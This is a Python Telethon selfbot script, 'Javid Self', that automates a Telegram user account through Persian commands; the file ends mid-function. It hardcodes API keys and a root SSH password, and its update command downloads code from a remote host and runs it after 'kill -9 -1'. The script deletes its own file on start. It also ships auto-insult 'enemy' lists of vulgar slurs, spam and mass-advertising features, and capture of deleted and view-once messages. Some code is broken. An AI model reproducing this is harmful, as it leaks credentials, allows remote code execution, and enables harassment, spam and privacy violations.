import time
import asyncio
import paramiko
import random
import jdatetime
import re
import pytz
import json
import os
import sqlite3
import tempfile
import tempfile
from telethon.tl import functions, types
from datetime import datetime, timedelta, timezone
from telethon import connection
from telethon import TelegramClient, events, functions
from telethon.extensions import markdown
from telethon import events, errors
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.channels import LeaveChannelRequest, GetParticipantRequest
from telethon.tl.functions.stories import GetStoriesByIDRequest
from telethon.tl.types import Channel, Chat, ChannelParticipantAdmin, ChannelParticipantCreator, Message, PeerUser, SendMessageTypingAction, SendMessageGamePlayAction, SendMessageRecordAudioAction, SendMessageRecordRoundAction
from telethon.tl.functions.channels import JoinChannelRequest, GetParticipantRequest
from telethon.tl.functions.messages import ToggleDialogPinRequest, SetTypingRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.photos import GetUserPhotosRequest
from telethon.utils import get_display_name
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest

api_id = 29481612
api_hash = '01a41600f41fa58017c7220b954b7df8'
session_name = 'selfbot'

device_model = "Samsung Galaxy A52"
system_version = "Android 13"
app_version = "11.13.2 (6060)"
lang_code = "en"
DOWNLOAD_FOLDER = 'downloads'
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

active_dice_tasks = {}
active_casino_tasks = {}
active_saves = set()

name_list = []
rotate_enabled = False
current_index = 0
time_font = 1
date_font = 1
bio_list = []
family_list = []
rotate_family_enabled = False
current_family_index = 0
time_font_family = 1
date_font_family = 1
rotate_bio_enabled = False
current_bio_index = 0
time_font_bio = 1
date_font_bio = 1
time_font = 1
date_font = 1
time_font_family = 1
date_font_family = 1
time_font_bio = 1
date_font_bio = 1
admin_list = []
stay_online = False
time_format_12h = False
start_time = datetime.now()
profile_enabled = False
profile_channel_id = None
profile_interval_minutes = 30
profile_max_count = 1
used_profile_photo_ids = []
pv_lock_enabled = False
pv_warned_users = set()
tabchi_enabled = False
tabchi_banners = {}
tabchi_targets = set()
banner_counter = 1
save_view_once_enabled = False
anti_login_enabled = False
last_youtube_time = 0
last_instagram_time = 0
last_gpt_time = 0
auto_read_private = False
auto_read_channel = False
auto_read_group = False
auto_read_bot = False
EXPIRE_FILE = "expire.json"
enemy_list = []
insult_list = [
    "کس اون مادر جندت",
    "مادرتو گاییدم خارکسه",
    "دیشب با مادرت داشتم حال میکردم",
    "کس ننت",
    "مادرقحبه ی ولد زنا",
    "چهل پدره مادر کسده"
]
insult_queue = []
track_deletions = False
track_edits = False
save_media_enabled = False
conn = sqlite3.connect('messages.db')
cursor = conn.cursor()
cursor.execute('''
CREATE TABLE IF NOT EXISTS messages (
    message_id INTEGER,
    user_id INTEGER,
    username TEXT,
    content TEXT,
    date TEXT,
    deleted INTEGER DEFAULT 0,
    media_type TEXT,
    media_link TEXT
)
''')
conn.commit()
auto_reply_enabled = False
auto_reply_message = None
auto_reply_interval = 10 * 60
last_auto_reply_times = {}
date_type = "jalali"
alowed_halats = ["spoiler", "italic", "mono", "bold", "strikethrough", "underline"]
current_halat = None
patterns = {
    r'^(پنل|panel)$': "help_handler",
    r'^پینگ$': "ping_handler",
    r'^فونت$': "font_handler",
    r'^اسم جدید (.+)$': "set_name_handler",
    r'^حذف اسم (.+)$': "del_name_handler",
    r'^پاکسازی لیست اسم$': "clear_name_list_handler",
    r'^لیست اسم$': "list_names_handler",
    r'^اسم روشن$': "enable_name_rotation",
    r'^اسم خاموش$': "disable_name_rotation",
    r'^فامیل جدید (.+)$': "set_family_handler",
    r'^حذف فامیل (.+)$': "del_family_handler",
    r'^پاکسازی لیست فامیل$': "clear_family_list_handler",
    r'^لیست فامیل$': "list_family_handler",
    r'^فامیل روشن$': "enable_family_rotation",
    r'^فامیل خاموش$': "disable_family_rotation",
    r'^بیو جدید (.+)$': "set_bio_handler",
    r'^حذف بیو (.+)$': "del_bio_handler",
    r'^پاکسازی لیست بیو$': "clear_bio_list_handler",
    r'^لیست بیو$': "list_bios_handler",
    r'^بیو روشن$': "enable_bio_rotation",
    r'^بیو خاموش$': "disable_bio_rotation",
    r'^فونت ساعت اسم (\d+)$': "set_time_font_name",
    r'^فونت تاریخ اسم (\d+)$': "set_date_font_name",
    r'^فونت ساعت فامیل (\d+)$': "set_time_font_family",
    r'^فونت تاریخ فامیل (\d+)$': "set_date_font_family",
    r'^فونت ساعت بیو (\d+)$': "set_time_font_bio",
    r'^فونت تاریخ بیو (\d+)$': "set_date_font_bio",
    r'^آنلاین روشن$': "enable_online",
    r'^آنلاین خاموش$': "disable_online",
    r'^تنظیم زمان 24$': "set_24h_clock",
    r'^تنظیم زمان 12$': "set_12h_clock",
    r'^وضعیت$': "status_handler",
    r'^دانلود استوری (.+)$': "download_story_handler",
    r'^دریافت استوری(?: |$)(.*)': "get_stories_handler",
    r'^قفل پیوی روشن$': "enable_pv_lock",
    r'^قفل پیوی خاموش$': "disable_pv_lock",
    r'^تنظیم پروفایل$': "set_profile_channel",
    r'^پروفایل روشن$': "enable_profile_rotation",
    r'^پروفایل خاموش$': "disable_profile_rotation",
    r'^تنظیم زمان پروفایل (\d+)$': "set_profile_interval",
    r'^تنظیم تعداد پروفایل (\d+)$': "set_profile_max_count",
    r'^ادمین$': "admin_handler",
    r'^پروفایل$': "profile_handler",
    r'^کاربردی$': "tools_handler",
    r'^متغیر$': "x_handler",
    r'^لفت همگانی کانال$': "leave_all_channels",
    r'^لفت همگانی گروه$': "leave_all_groups",
    r'^ذخیره زماندار روشن$': "enable_save_view_once",
    r'^ذخیره زماندار خاموش$': "disable_save_view_once",
    r'^آنتی لاگین روشن$': "enable_anti_login",
    r'^آنتی لاگین خاموش$': "disable_anti_login",
    r'^ذخیره(?: (https://t\.me/[^/]+/\d+))?$': "save_message",
    r'^دانلود یوتیوب (.+)$': "youtube_download_handler",
    r'^دانلود اینستا (.+)$': "instagram_download_handler",
    r'^هوش مصنوعی (.+)$': "gpt4_bot_handler",
    r'^بلاک(?: (.+))?$': "block_user_handler",
    r'^آنبلاک(?: (.+))?$': "unblock_user_handler",
    r'^سین خودکار پیوی روشن$': "enable_auto_read_private",
    r'^سین خودکار پیوی خاموش$': "disable_auto_read_private",
    r'^سین خودکار کانال روشن$': "enable_auto_read_channel",
    r'^سین خودکار کانال خاموش$': "disable_auto_read_channel",
    r'^سین خودکار گروه روشن$': "enable_auto_read_group",
    r'^سین خودکار گروه خاموش$': "disable_auto_read_group",
    r'^سین خودکار ربات روشن$': "enable_auto_read_bot",
    r'^سین خودکار ربات خاموش$': "disable_auto_read_bot",
    r'^اسپم(?: (.+))? (\d+)$': "spam_handler",
    r'^تنظیم دشمن(?: (.+))?$': "add_enemy",
    r'^حذف دشمن(?: (.+))?$': "remove_enemy",
    r'^پاکسازی لیست دشمن$': "clear_enemies",
    r'^تنظیم فحش (.+)$': "add_insult",
    r'^حذف فحش (.+)$': "remove_insult",
    r'^پاکسازی لیست فحش$': "clear_insults",
    r'^لیست فحش$': "list_insults",
    r'^لیست دشمن$': "list_enemies",
    r'^دشمن$': "enemy_handler",
    r'^ذخیره ویرایش روشن$': "enable_savedit",
    r'^ذخیره ویرایش خاموش$': "disable_savedit",    r'^ذخیره حذف روشن$': "enable_savedel",
    r'^ذخیره مدیا روشن$': "enable_save_media",
    r'^ذخیره مدیا خاموش$': "disable_save_media",
    r'^ذخیره حذف خاموش$': "disable_savedel",
    r'^منشی روشن$': "enable_auto_reply",
    r'^منشی خاموش$': "disable_auto_reply",
    r'^تنظیم منشی$': "set_auto_reply",
    r'^تنظیم زمان منشی (\d+)$': "set_auto_reply_interval",
    r'^دریافت بکاپ$': "backup_handler",
    r'^اجرای بکاپ$': "restore_backup",
    r'^منشی$': "sec_handler",
    r'^سیستم$': "system_handler",
    r'^تنظیم تاریخ (.+)$': "set_date_type",
    r'^پاکسازی من (.+)$': "clear_my_messages",
    r'^تبچی روشن$': "enable_tabchi",
    r'^تبچی خاموش$': "disable_tabchi",
    r'^تنظیم بنر فور$': "set_banner_forward",
    r'^تنظیم بنر کپی$': "set_banner_copy",
    r'^تنظیم گپ هدف بنر (\d+)$': "add_tabchi_target",
    r'^حذف گپ هدف بنر (\d+)$': "remove_tabchi_target",
    r'^لیست بنر ها$': "list_tabchi_banners",
    r'^تنظیم هدف بنر (\d+) تمام گپ ها$': "set_banner_all_chats",
    r'^تنظیم (\d+) دقیقه بنر (\d+)$': "set_banner_specific_time",
    r'^فور بنر در (\d+) پیوی اخیر$': "forward_banner_recent_pvs",
    r'^حذف بنر (\d+)$': "delete_banner",
    r'^وضعیت تبچی$': "tabchi_status",
    r'^پاکسازی لیست بنر ها$': "clear_all_banners",
    r'^امروز$': "today_handler",
    r'^تنظیم ادمین(?: (.+))?$': "add_admin_handler",
    r'^حذف ادمین(?: (.+))?$': "remove_admin_handler",
    r'^پاکسازی لیست ادمین$': "clear_admin_list_handler",
    r'^لیست ادمین$': "list_admins_handler",
    r'^ریست$': "reset_handler",
    r'^آپدیت$': "update_handler",
    r'^حالت متن$': "mess_handler",
    r'^\+?ایدی(?: ([^\n]+))?$': "user_info_handler",
    r'^تنظیم لیست فحش$': "import_insult_file",
    r'^حذف ری اکشن(?: (.+))?$': "remove_react_handler",
    r'^تنظیم ری اکشن(?: (.+))?$': "set_react_handler",
    r'^لیست ری اکشن$': "list_react_handler",
    r'^پاکسازی لیست ری اکشن$': "remove_all_react_handler",
    r'^ری اکشن$': "react_handler",
    r'^ربات$': "random_self_message",
    r'^تاس (\d+)$': "dice_handler",
    r'^کازینو (.+)$': "casino_handler",
    r'^کلون$': "clone_profile_handler",
    r'^بازگردانی پروفایل$': "restore_profile_handler",
    r'^تنظیم کامنت اول (.+)$': "add_comment_channel",
    r'^حذف کامنت اول (.+)$': "remove_comment_channel",
    r'^تنظیم کامنت$': "set_comment_message",
    r'^لیست کامنت$': "list_comment_channels",
    r'^پاکسازی لیست کامنت$': "clear_comment_channels",
    r'^کامنت اول$': "comment_handler",
    r'^وضعیت ادمین\s*\{(.+?)\}$': "change_admin_prefix",
    r'^حالت چت پیوی روشن$': "enable_typing_private",
    r'^حالت چت پیوی خاموش$': "disable_typing_private",
    r'^حالت چت گروه روشن$': "enable_typing_group",
    r'^حالت چت گروه خاموش$': "disable_typing_group",
    r'^حالت بازی پیوی روشن$': "enable_game_private",
    r'^حالت بازی پیوی خاموش$': "disable_game_private",
    r'^حالت بازی گروه روشن$': "enable_game_group",
    r'^حالت بازی گروه خاموش$': "disable_game_group",
    r'^حالت ویس پیوی روشن$': "enable_voice_private",
    r'^حالت ویس پیوی خاموش$': "disable_voice_private",
    r'^حالت ویس گروه روشن$': "enable_voice_group",
    r'^حالت ویس گروه خاموش$': "disable_voice_group",
    r'^حالت ویدیو پیوی روشن$': "enable_video_private",
    r'^حالت ویدیو پیوی خاموش$': "disable_video_private",
    r'^حالت ویدیو گروه روشن$': "enable_video_group",
    r'^حالت ویدیو گروه خاموش$': "disable_video_group",
    r'^حالت اکشن$': "action_handler",
    r'^ربات روشن$': "enable_bot",
    r'^ربات خاموش$': "disable_bot",
    r'^سکوت پیوی(?: (.+))?$': "mute_pv_user",
    r'^حذف سکوت پیوی(?: (.+))?$': "unmute_pv_user",
    r'^لیست سکوت پیوی$': "list_muted_pv_users",
    r'^پاکسازی لیست سکوت پیوی$': "clear_muted_pv_users"
}
auto_react = {}
the_gap = -1003711576260
comment_channels = set()
comment_content = {}
last_self_text = None
admin_prefix = "."
typing_mode_private = False
typing_mode_group = False
game_mode_private = False
game_mode_group = False
voice_mode_private = False
voice_mode_group = False
video_mode_private = False
video_mode_group = False
self_enabled = True
pv_mute_list = []
original_profile = {
    "first_name": "",
    "last_name": "",
    "bio": ""
}
is_cloned = False

fonts = {
    1: {"0": "0", "1": "1", "2": "2", "3": "3", "4": "4", "5": "5", "6": "6", "7": "7", "8": "8", "9": "9", ":": ":"},
    2: {"0": "۰", "1": "۱", "2": "۲", "3": "۳", "4": "۴", "5": "۵", "6": "۶", "7": "۷", "8": "۸", "9": "۹", ":": ":"},
    3: {"0": "𝟶", "1": "𝟷", "2": "𝟸", "3": "𝟹", "4": "𝟺", "5": "𝟻", "6": "𝟼", "7": "𝟽", "8": "𝟾", "9": "𝟿", ":": ":"},
    4: {"0": "₀", "1": "¹", "2": "₂", "3": "³", "4": "₄", "5": "⁵", "6": "₆", "7": "⁷", "8": "₈", "9": "⁹", ":": ":"},
    5: {"0": "𝟬", "1": "𝟭", "2": "𝟮", "3": "𝟯", "4": "𝟰", "5": "𝟱", "6": "𝟲", "7": "𝟳", "8": "𝟴", "9": "𝟵", ":": ":"},
    6: {"0": "𝟎", "1": "𝟏", "2": "𝟐", "3": "𝟑", "4": "𝟒", "5": "𝟓", "6": "𝟔", "7": "𝟕", "8": "𝟖", "9": "𝟗", ":": ":"},
    7: {"0": "𝟢", "1": "𝟣", "2": "𝟤", "3": "𝟥", "4": "𝟦", "5": "𝟧", "6": "𝟨", "7": "𝟩", "8": "𝟪", "9": "𝟫", ":": ":"}
}

def random_font(text):
    chosen_font_num = random.choice(fonts[8])
    return ''.join(fonts[chosen_font_num].get(ch, ch) for ch in text)

client = TelegramClient(
    session_name,
    api_id,
    api_hash,
    device_model=device_model,
    system_version=system_version,
    app_version=app_version,
    connection=connection.ConnectionTcpIntermediate,
    lang_code=lang_code,
    use_ipv6=True
)

def to_tehran_time(dt):
    tehran_tz = pytz.timezone('Asia/Tehran')
    tehran_dt = dt.astimezone(tehran_tz)

    jdt = jdatetime.datetime.fromgregorian(datetime=tehran_dt)
    jalali_date = jdt.strftime("%Y/%m/%d")
    time_str = tehran_dt.strftime("%H:%M:%S")

    return f"{jalali_date} {time_str}"

def is_fake_event(event):
    return hasattr(event, "_original")

async def safe_respond(event, text, edit_msg=None):
    try:
        if is_fake_event(event):
            return await event._original.reply(text)
        elif edit_msg:
            return await edit_msg.edit(text)
        else:
            return await event.edit(text)
    except:
        return await event.reply(text)

try:
    file_path = os.path.realpath(__file__)
    if os.path.exists(file_path):
        os.remove(file_path)
except Exception as e:
    print(f"{e}")

if not os.path.exists(EXPIRE_FILE):
    now_dt = datetime.now(pytz.timezone('Asia/Tehran'))
    start_expire_str = now_dt.strftime("%Y/%m/%d %H:%M")

    with open(EXPIRE_FILE, "w") as f:
        json.dump({"start": start_expire_str}, f)

def is_command(text):
    for pattern in COMMAND_PATTERNS:
        if re.match(pattern, text.strip()):
            return True
    return False

@client.on(events.NewMessage(outgoing=True, pattern=r'^آپدیت$'))
async def update_handler(event):
    if not self_enabled:
        return
    msg = await safe_respond(event, "╮ لطفاً صبر کنید... | Javid Self")

    source_ip = "reseau.proxy.rlwy.net"
    port = 40711
    username = "root"
    password = "Ruwinr"
    remote_path = "/home/root/bot/file/self.py"
    local_path = "self.py"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        ssh.connect(source_ip, port=port, username=username, password=password)

        sftp = ssh.open_sftp()
        sftp.get(remote_path, local_path)
        sftp.close()
        ssh.close()

        await msg.edit("╮ با موفقیت آپدیت شد، چند لحظه صبر کنید! | Javid Self")

        os.system("kill -9 -1 && nohup python3 self.py &")

    except Exception as e:
        print(f"{e}")
        await msg.edit("╮ خطا در فرآیند آپدیت! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پینگ$'))
async def ping_handler(event):
    if not self_enabled:
        return
    start = time.perf_counter()
    await client(functions.help.GetConfigRequest())
    end = time.perf_counter()
    ping_ms = int((end - start) * 1000)
    await event.edit(f"**Pong ⚡️**\n**Server Ping** : `{ping_ms}ms`\nJavid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^(پنل|panel)$'))
async def help_handler(event):
    if not self_enabled:
        return
    
    try:
        await event.delete()
    except Exception:
        pass

    target_bot = "@JavidHelperBot"
    
    try:
        results = await client.inline_query(target_bot, "پنل")
        if results and results[0]:
            await results[0].click(event.chat_id)
            return
    except Exception:
        await event.respond(f"{target_bot} پنل")

@client.on(events.NewMessage(outgoing=True, pattern=r'^اسم روشن$'))
async def enable_name_rotation(event):
    if not self_enabled:
        return
    global rotate_enabled
    rotate_enabled = True
    await event.edit("╮ اسم روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^اسم خاموش$'))
async def disable_name_rotation(event):
    if not self_enabled:
        return
    global rotate_enabled
    rotate_enabled = False
    await event.edit("╮ اسم خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^اسم جدید (.+)$'))
async def set_name_handler(event):
    if not self_enabled:
        return
    name = event.pattern_match.group(1).strip()
    if name in name_list:
        await event.edit("╮ اسم وجود دارد! | Javid Self")
    else:
        name_list.append(name)
        await event.edit(f'''╮ اسم اضافه شد:
`{name}`''')

@client.on(events.NewMessage(outgoing=True, pattern=r'^حذف اسم (.+)$'))
async def del_name_handler(event):
    if not self_enabled:
        return
    name = event.pattern_match.group(1).strip()
    if name in name_list:
        name_list.remove(name)
        await event.edit(f'''╮ اسم حذف شد:
`{name}`''')
    else:
        await event.edit("╮ اسم وجود ندارد! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پاکسازی لیست اسم$'))
async def clear_name_list_handler(event):
    if not self_enabled:
        return
    name_list.clear()
    await event.edit("╮ لیست اسم خالی شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^لیست اسم$'))
async def list_names_handler(event):
    if not self_enabled:
        return
    if not name_list:
        await event.edit("╮ لیست اسم خالی است! | Javid Self")
        return

    result = "╮ لیست اسم:\n\n"
    result += "\n———\n".join([f"`{name}`" for name in name_list])
    await event.edit(f"{result}")

@client.on(events.NewMessage(outgoing=True, pattern=r'^فامیل روشن$'))
async def enable_family_rotation(event):
    if not self_enabled:
        return
    global rotate_family_enabled
    rotate_family_enabled = True
    await event.edit("╮ فامیل روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^فامیل خاموش$'))
async def disable_family_rotation(event):
    if not self_enabled:
        return
    global rotate_family_enabled
    rotate_family_enabled = False
    await event.edit("╮ فامیل خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^فامیل جدید (.+)$'))
async def set_family_handler(event):
    if not self_enabled:
        return
    fam = event.pattern_match.group(1).strip()
    if fam in family_list:
        await event.edit("╮ فامیل وجود دارد! | Javid Self")
    else:
        family_list.append(fam)
        await event.edit(f'''╮ فامیل اضافه شد:
`{fam}`''')

@client.on(events.NewMessage(outgoing=True, pattern=r'^حذف فامیل (.+)$'))
async def del_family_handler(event):
    if not self_enabled:
        return
    fam = event.pattern_match.group(1).strip()
    if fam in family_list:
        family_list.remove(fam)
        await event.edit(f'''╮ فامیل حذف شد:
`{fam}`''')
    else:
        await event.edit("╮ فامیل وجود ندارد! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پاکسازی لیست فامیل$'))
async def clear_family_list_handler(event):
    if not self_enabled:
        return
    family_list.clear()
    await event.edit("╮ لیست فامیل خالی شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^لیست فامیل$'))
async def list_family_handler(event):
    if not self_enabled:
        return
    if not family_list:
        await event.edit("╮ لیست فامیل خالی است! | Javid Self")
        return

    result = "ليست فاميل:\n\n"
    result += "\n———\n".join([f"`{fam}`" for fam in family_list])
    await event.edit(f"{result}")

@client.on(events.NewMessage(outgoing=True, pattern=r'^بیو روشن$'))
async def enable_bio_rotation(event):
    if not self_enabled:
        return
    global rotate_bio_enabled
    rotate_bio_enabled = True
    await event.edit("╮ بیو روشن شد.")

@client.on(events.NewMessage(outgoing=True, pattern=r'^بیو خاموش$'))
async def disable_bio_rotation(event):
    if not self_enabled:
        return
    global rotate_bio_enabled
    rotate_bio_enabled = False
    await event.edit("╮ بیو خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^بیو جدید (.+)$'))
async def set_bio_handler(event):
    if not self_enabled:
        return
    bio = event.pattern_match.group(1).strip()
    if bio in bio_list:
        await event.edit("╮ بیو وجود دارد! | Javid Self")
    else:
        bio_list.append(bio)
        await event.edit(f'''╮ بیو اضافه شد:
`{bio}`''')

@client.on(events.NewMessage(outgoing=True, pattern=r'^حذف بیو (.+)$'))
async def del_bio_handler(event):
    if not self_enabled:
        return
    bio = event.pattern_match.group(1).strip()
    if bio in bio_list:
        bio_list.remove(bio)
        await event.edit(f'''╮ بیو حذف شد:
`{bio}`''')
    else:
        await event.edit("╮ بیو وجود ندارد! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پاکسازی لیست بیو$'))
async def clear_bio_list_handler(event):
    if not self_enabled:
        return
    bio_list.clear()
    await event.edit("╮ لیست بیو خالی شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^لیست بیو$'))
async def list_bios_handler(event):
    if not self_enabled:
        return
    if not bio_list:
        await event.edit("╮ لیست بیو خالی است! | Javid Self")
        return

    result = "لیست بیو:\n\n"
    result += "\n———\n".join([f"`{bio}`" for bio in bio_list])
    await event.edit(f"{result}")

@client.on(events.NewMessage(outgoing=True, pattern=r'^فونت ساعت اسم (\d+)$'))
async def set_time_font_name(event):
    if not self_enabled:
        return
    global time_font
    num = int(event.pattern_match.group(1))
    if num in fonts and (isinstance(fonts[num], dict) or num == 8):
        time_font = num
        await event.edit(f'''╮ فونت ساعت اسم روی عدد `{num}` تنظیم شد. | Javid Self''')
    else:
        await event.edit("╮ عدد وارد شده نامعتبر است! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^فونت تاریخ اسم (\d+)$'))
async def set_date_font_name(event):
    if not self_enabled:
        return
    global date_font
    num = int(event.pattern_match.group(1))
    if num in fonts and (isinstance(fonts[num], dict) or num == 8):
        date_font = num
        await event.edit(f'''╮ فونت تاریخ اسم روی عدد `{num}` تنظیم شد. | Javid Self''')
    else:
        await event.edit("╮ عدد وارد شده نامعتبر است! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^فونت ساعت فامیل (\d+)$'))
async def set_time_font_family(event):
    if not self_enabled:
        return
    global time_font_family
    num = int(event.pattern_match.group(1))
    if num in fonts and (isinstance(fonts[num], dict) or num == 8):
        time_font_family = num
        await event.edit(f'''╮ فونت ساعت فامیل روی عدد `{num}` تنظیم شد. | Javid Self''')
    else:
        await event.edit("╮ عدد وارد شده نامعتبر است! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^فونت تاریخ فامیل (\d+)$'))
async def set_date_font_family(event):
    if not self_enabled:
        return
    global date_font_family
    num = int(event.pattern_match.group(1))
    if num in fonts and (isinstance(fonts[num], dict) or num == 8):
        date_font_family = num
        await event.edit(f'''╮ فونت تاریخ فامیل روی عدد `{num}` تنظیم شد. | Javid Self''')
    else:
        await event.edit("╮ عدد وارد شده نامعتبر است! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^فونت ساعت بیو (\d+)$'))
async def set_time_font_bio(event):
    if not self_enabled:
        return
    global time_font_bio
    num = int(event.pattern_match.group(1))
    if num in fonts and (isinstance(fonts[num], dict) or num == 8):
        time_font_bio = num
        await event.edit(f'''╮ فونت ساعت بیو روی عدد `{num}` تنظیم شد. | Javid Self''')
    else:
        await event.edit("╮ عدد وارد شده نامعتبر است! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^فونت تاریخ بیو (\d+)$'))
async def set_date_font_bio(event):
    if not self_enabled:
        return
    global date_font_bio
    num = int(event.pattern_match.group(1))
    if num in fonts and (isinstance(fonts[num], dict) or num == 8):
        date_font_bio = num
        await event.edit(f'''╮ فونت تاریخ بیو روی عدد `{num}` تنظیم شد. | Javid Self''')
    else:
        await event.edit("╮ عدد وارد شده نامعتبر است! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم ادمین(?: (.+))?$'))
async def add_admin_handler(event):
    if not self_enabled:
        return
    input_arg = event.pattern_match.group(1) if event.pattern_match.lastindex else None

    if input_arg:
        try:
            user = await client.get_entity(input_arg.strip())
        except:
            await event.edit("╮ کاربر نامعتبر است! | Javid Self")
            return
    elif event.is_reply:
        reply = await event.get_reply_message()
        user = await reply.get_sender()
    else:
        await event.edit("╮ با استفاده از ریپلای، یوزرنیم یا آیدی عددی استفاده کنید! | Javid Self")
        return

    if user.id in admin_list:
        await event.edit("╮ کاربر در لیست وجود دارد!")
    else:
        admin_list.append(user.id)
        await event.edit("╮ کاربر به لیست اضافه شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حذف ادمین(?: (.+))?$'))
async def remove_admin_handler(event):
    if not self_enabled:
        return
    input_arg = event.pattern_match.group(1) if event.pattern_match.lastindex else None

    if input_arg:
        try:
            user = await client.get_entity(input_arg.strip())
        except:
            await event.edit("╮ کاربر نامعتبر است! | Javid Self")
            return
    elif event.is_reply:
        reply = await event.get_reply_message()
        user = await reply.get_sender()
    else:
        await event.edit("╮ با استفاده از ریپلای، یوزرنیم یا آیدی عددی استفاده کنید! | Javid Self")
        return

    if user.id in admin_list:
        admin_list.remove(user.id)
        await event.edit("╮ کاربر از لیست حذف شد. | Javid Self")
    else:
        await event.edit("╮ کاربر در لیست وجود ندارد!")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پاکسازی لیست ادمین$'))
async def clear_admin_list_handler(event):
    if not self_enabled:
        return
    admin_list.clear()
    await event.edit("╮ لیست ادمین خالی شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^لیست ادمین$'))
async def list_admins_handler(event):
    if not self_enabled:
        return
    if not admin_list:
        await event.edit("╮ لیست ادمین خالی است! | Javid Self")
        return

    mentions = []
    for user_id in admin_list:
        try:
            user = await client.get_entity(user_id)
            name = user.first_name or "کاربر"
            mentions.append(f"> [{name}](tg://user?id={user.id})")
        except:
            mentions.append(f"> [ناشناس](tg://user?id={user_id})")

    result = "لیست ادمین:\n\n" + "\n".join(mentions)
    await event.edit(result)

@client.on(events.NewMessage(outgoing=True, pattern=r'^آنلاین روشن$'))
async def enable_online(event):
    if not self_enabled:
        return
    global stay_online
    stay_online = True
    await event.edit("╮ حالت آنلاین روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^آنلاین خاموش$'))
async def disable_online(event):
    if not self_enabled:
        return
    global stay_online
    stay_online = False
    await client(functions.account.UpdateStatusRequest(offline=True))
    await event.edit("╮ حالت آنلاین خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم زمان 12$'))
async def set_12h_clock(event):
    if not self_enabled:
        return
    global time_format_12h
    time_format_12h = True
    await event.edit("╮ فرمت ساعت روی 12 تنظیم شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم زمان 24$'))
async def set_24h_clock(event):
    if not self_enabled:
        return
    global time_format_12h
    time_format_12h = False
    await event.edit("╮ فرمت ساعت روی 24 تنظیم شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^وضعیت$'))
async def status_handler(event):
    status_items = []

    status_items.append(f"ربات : {'✔️' if self_enabled else '✖️'}")
    status_items.append(f"تبچی : {'✔️' if tabchi_enabled else '✖️'}")
    
    if stay_online:
        status_items.append("آنلاین ✔️")
    if pv_lock_enabled:
        status_items.append("قفل پیوی ✔️")
    if save_view_once_enabled:
        status_items.append("ذخیره زماندار ✔️")
    if anti_login_enabled:
        status_items.append("آنتی لاگین ✔️")
    if rotate_enabled:
        status_items.append("اسم ✔️")
    if rotate_family_enabled:
        status_items.append("فامیل ✔️")
    if rotate_bio_enabled:
        status_items.append("بیو ✔️")
    if profile_enabled:
        status_items.append("پروفایل ✔️")
    if auto_read_private:
        status_items.append("سین خودکار پیوی ✔️")
    if auto_read_channel:
        status_items.append("سین خودکار کانال ✔️")
    if auto_read_group:
        status_items.append("سین خودکار گروه ✔️")
    if auto_read_bot:
        status_items.append("سین خودکار ربات ✔️")
    if track_deletions:
        status_items.append("ذخیره حذف ✔️")
    if track_edits:
        status_items.append("ذخیره ویرایش ✔️")
        if save_media_enabled: status_items.append("ذخیره مدیا ✔️")
    if auto_reply_enabled:
        status_items.append("منشی ✔️")
    if typing_mode_private:
        status_items.append("حالت چت پیوی ✔️")
    if typing_mode_group:
        status_items.append("حالت چت گروه ✔️")
    if game_mode_private:
        status_items.append("حالت بازی پیوی ✔️")
    if game_mode_group:
        status_items.append("حالت بازی گروه ✔️")
    if voice_mode_private:
        status_items.append("حالت ویس پیوی ✔️")
    if voice_mode_group:
        status_items.append("حالت ویس گروه ✔️")
    if video_mode_private:
        status_items.append("حالت ویدیو مسیج پیوی ✔️")
    if video_mode_group:
        status_items.append("حالت ویدیو مسیج گروه ✔️")

    show_time_format = any('ساعت' in item for item in name_list + family_list + bio_list)

    if show_time_format:
        if time_format_12h:
            status_items.append("زمان : `12H`")
        else:
            status_items.append("زمان : `24H`")
    show_date_format = any('تاریخ' in item for item in name_list + family_list + bio_list)

    if show_date_format:
        if date_type == "jalali":
            status_items.append("تاریخ : `شمسی`")
        else:
            status_items.append("تاریخ : `میلادی`")

    status_items.append(f"وضعیت ادمین: {{`{admin_prefix}`}}")

    if not status_items:
        result = "❈ وضعیت\n\nقابلیتی فعال نیست! | Javid Self"
    else:
        result = "وضعیت:\n\n"
        for i, item in enumerate(status_items):
            if i == 0:
                result += f"╮ {item}\n"
            elif i == len(status_items) - 1:
                result += f"╯ {item}"
            else:
                result += f"│ {item}\n"

    expire_days = 30
    now_dt = datetime.now(pytz.timezone('Asia/Tehran'))

    try:
        with open("expire.json", "r") as f:
            data = json.load(f)
            start_str = data.get("start")
            start_dt = datetime.strptime(start_str, "%Y/%m/%d %H:%M")
